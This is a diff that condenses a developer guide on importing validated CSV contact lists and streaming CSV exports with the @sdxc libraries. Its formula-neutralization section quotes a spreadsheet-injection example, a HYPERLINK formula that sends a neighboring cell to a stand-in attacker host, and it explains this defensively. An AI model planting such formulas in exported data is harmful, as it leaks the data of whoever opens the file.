@@ -9,18 +9,15 @@ lastUpdated: 2026-10-25
 outcomes:
     - "How to read an uploaded CSV into validated rows with errors that name the line"
     - "How to stream an export with `@sdxc/csv` that spreadsheets open safely"
-    - "Why to neutralize formulas and how to write for other locales"
+    - "Why the writer neutralizes formulas and when to keep it on"
 ---
 
-CSV is how most people move data in and out of an app: a spreadsheet of contacts to import, a
-report to download on the first of the month. Both directions have traps. An upload arrives as
-untyped text that may be malformed halfway through, and an export can carry a cell a
-spreadsheet runs as a formula on the machine of whoever opens it.
-
-This guide imports a contact list and exports it back. [`@sdxc/csv`](/api/csv) reads and writes
-RFC 4180 and returns a `Result` wherever `JSON.parse` would throw,
-[`@sdxc/validate`](/api/validate) types each row with a schema, and
-[`@sdxc/http`](/api/http) sends the export as a download.
+CSV is how most people move data in and out of an app, and both directions have traps: an upload
+is untyped text that may be malformed halfway through, and an export can carry a cell a
+spreadsheet runs as a formula. This guide imports a contact list and exports it back.
+[`@sdxc/csv`](/api/csv) reads and writes RFC 4180 and returns a `Result` instead of throwing,
+[`@sdxc/validate`](/api/validate) types each row with a schema, and [`@sdxc/http`](/api/http)
+sends the export as a download.
 
 ```bash
 npm add @sdxc/csv @sdxc/http @sdxc/pagination @sdxc/result @sdxc/validate remix
@@ -28,9 +25,8 @@ npm add @sdxc/csv @sdxc/http @sdxc/pagination @sdxc/result @sdxc/validate remix
 
 ## Describe a row
 
-The reader returns strings only. CSV has no numbers, dates or empty values, and guessing would
-lose data: `"007"` read as a number is `7`. So the types come from a schema of your own, with
-one field per column header:
+The reader returns strings only, since guessing would lose data (`"007"` read as a number is
+`7`). The types come from a schema of your own, with one field per column header:
 
 ```typescript {% title="app/services/imports/contact-row.ts" %}
 import * as s from "remix/data-schema";
@@ -50,16 +46,16 @@ export const CONTACT_ROW = s.object({
 export type Contact = s.InferOutput<typeof CONTACT_ROW>;
 ```
 
-`coerce.number()` turns the column's `"3"` into `3` before `min` checks it. Columns the schema
-does not name are stripped, so a spreadsheet with an extra notes column still imports.
+Columns the schema does not name are stripped, so a spreadsheet with an extra notes column still
+imports.
 
 ## Parse the file and validate each row
 
 `parse` reads the header row as keys and returns every later record as a
 `Record<string, string>`. It fails on text it cannot turn into records at all, such as an
-unterminated quote or a record with the wrong number of fields, and the `CSVParseError` it
-returns carries the `line` it stopped on. A row that parses but fails the schema is a different
-kind of problem, so the import reports both, on one error that carries the list:
+unterminated quote, with the `line` it stopped on. A row that parses but fails the schema is a
+different problem, so the import collects every one, since a person fixing a file wants the
+whole list at once:
 
 ```typescript {% title="app/services/imports/read-contacts.ts" %}
 import type { Result } from "@sdxc/result";
@@ -113,15 +109,9 @@ export async function readContacts(
 }
 ```
 
-The row number is `index + 2`: one for the header, one because people count from one. For a
-file with no blank lines, which the reader skips, it is the number a spreadsheet shows beside
-the row. A file-level `line` is counted the way a text editor counts, line breaks inside quoted
-fields included, so the two differ once a cell holds a newline, which is why each problem
-names which one it carries.
-
-Collecting every row's problems before answering matters more than it looks. A person fixing a
-file in a spreadsheet wants the whole list at once, not one error per upload. `describe` puts
-the column's name in front of each message:
+The row number is `index + 2`, one for the header and one because people count from one, which
+is the number a spreadsheet shows beside the row. `describe` puts the column's name in front of
+each message:
 
 ```typescript {% title="app/services/imports/read-contacts.ts" %}
 interface Issue {
@@ -138,15 +128,10 @@ function describe(issue: Issue): string {
 }
 ```
 
-`parse` also returns `warnings`, each with a `line` and `message`, for departures from RFC 4180
-it accepted, such as a bare `"` inside an unquoted field. They are worth showing beside a
-successful import.
-
 ## Accept the upload
 
-The action reads the file from the form, hands its text to `readContacts`, and either renders
-the problems or saves every contact. The file field is validated like any other:
-`remix/data-schema/form-data`'s `f.file()` refuses a submission that carries no file.
+The action validates the file field, hands its text to `readContacts`, and either renders the
+problems or saves every contact:
 
 ```tsx {% title="app/http/controllers/contacts/import.tsx" %}
 import { redirect } from "@sdxc/http/response";
@@ -183,9 +168,8 @@ export default createAction(routes.contacts.import, async (ctx) => {
 });
 ```
 
-`Contacts` is your own table, and `ctx.account` the signed-in account your auth middleware
-publishes. The import is all or nothing: a file with one bad row saves nothing, so fixing it and
-uploading it again cannot duplicate the rows that were fine.
+The import is all or nothing: a file with one bad row saves nothing, so uploading it again after
+a fix cannot duplicate the rows that were fine.
 
 <note>
 D1 commits each statement as it runs, so `Contacts.createMany` keeps the import all or nothing
@@ -201,10 +185,9 @@ The whole file is read into memory, so cap its size where the body is parsed, wi
 
 ## Stream an export
 
-`streamify` writes rows as a UTF-8 byte stream while they are read, from an array or an async
-iterable. An async generator that pages through the table with
-[`Pagination.byKeyset`](/api/pagination) keeps the export's memory flat however many contacts
-an account holds:
+`streamify` writes rows as a UTF-8 byte stream while they are read. An async generator that pages
+through the table with [`Pagination.byKeyset`](/api/pagination) keeps the export's memory flat
+however many contacts an account holds:
 
 ```typescript {% title="app/http/controllers/contacts/export.ts" %}
 import type { Database } from "remix/data-table";
@@ -262,37 +245,18 @@ export default createAction(routes.contacts.export, (ctx) => {
 });
 ```
 
-Each page seeks forward from `cursors.next`, the position of the last row the previous page
-returned, and the loop ends when a page comes back without one. Keyset paging never counts and
-never skips an offset, so the thousandth page costs what the first does, and a contact added
-while the export runs cannot shift a row onto the next page twice. `created_at` breaks no ties,
-so `id` follows it as the tiebreaker `byKeyset` requires. A failed page throws inside the
-generator, which errors the stream: the download fails visibly rather than arriving cut short.
-[Paginate lists](/docs/http-apis/paginate-lists) covers keyset paging for a page a person reads.
-
-`columns` is required here because the header goes out before the first row is read, so a slow
-first query still starts the download. Each cell writes by its type: numbers as `String(value)`,
-a `Date` as ISO 8601 in UTC, and `null` as an empty field. `csv()` sets
-`text/csv; charset=utf-8`, and `attachment()` builds a `Content-Disposition` that carries a
-non-ASCII filename exactly. If the client disconnects, cancelling the stream stops the
-generator, so no further page is read once nobody is downloading.
-
-`stringify` takes the same options and returns the whole file as one string, in a `Result`, for
-a small export or an email attachment.
+Keyset paging makes the thousandth page cost what the first does, with `id` as the tiebreaker
+`byKeyset` requires. A failed page throws inside the generator, which errors the stream, so the
+download fails visibly rather than arriving cut short. `columns` lets the header go out before
+the first row is read, and a `Date` cell writes as ISO 8601 in UTC.
 
 ## Neutralize formulas
 
-A contact named `=HYPERLINK("https://evil.example/?"&B2,"Open")` is just text to your app. When
-an admin opens the export in a spreadsheet, it is a live formula that can send the neighboring
-cell, an email address, to someone else's server. The attacker only had to sign up with that
-name.
-
-That is why the writer neutralizes by default. A string cell starting with `=`, `+`, `-`, `@`,
-tab or carriage return gets a leading `'`, which a spreadsheet treats as "show this as text",
-so the name above displays as written and runs nothing. Only strings are touched: a number cell's
-type already says it is data, so `-12` written as the number `-12` stays a number. Keep numeric
-columns numeric in the rows you export, since a balance pre-formatted as the string `"-12.50"`
-would come out as `'-12.50`.
+A contact named `=HYPERLINK("https://evil.example/?"&B2,"Open")` is just text to your app, but in
+a spreadsheet it is a live formula that can send the neighboring cell to someone else's server.
+So the writer neutralizes by default: a string cell starting with `=`, `+`, `-`, `@`, tab or
+carriage return gets a leading `'`, which a spreadsheet shows as text. Only strings are touched,
+so keep numeric columns numeric in the rows you export.
 
 <warning>
 Turn it off with `escapeFormulas: false` only for a file no spreadsheet opens, such as a feed a
@@ -300,30 +264,9 @@ script reads, where the added `'` would be part of the text the program sees. An
 person downloads keeps the default.
 </warning>
 
-## Write for spreadsheets in other locales
-
-Excel in decimal-comma locales, such as Spanish, German or French, splits a `.csv` on `;`
-instead of `,`, and reads it as UTF-8 only when it starts with a byte order mark. Both are
-options on the writer:
-
-```typescript {% title="app/services/exports/spreadsheet-options.ts" %}
-import type { WriteOptions } from "@sdxc/csv";
-
-export function spreadsheetOptions(locale: string): WriteOptions {
-	let parts = new Intl.NumberFormat(locale).formatToParts(1.5);
-	let decimalComma = parts.find((part) => part.type === "decimal")?.value === ",";
-	return { delimiter: decimalComma ? ";" : ",", bom: true };
-}
-```
-
-Spread the result into the `streamify` options for a download a person opens. Leave both off for
-files programs read: some parsers take the byte order mark as part of the first header.
-
 ## Test the import
 
-`readContacts` takes text and answers a `Result`, so its test needs no request and no
-database. One case proves a clean file types its rows, the other that every bad row is reported
-by the number a spreadsheet shows:
+`readContacts` takes text and answers a `Result`, so its test needs no request and no database:
 
 ```typescript {% title="app/services/imports/read-contacts.test.ts" %}
 import { isFailure, unwrap } from "@sdxc/result";
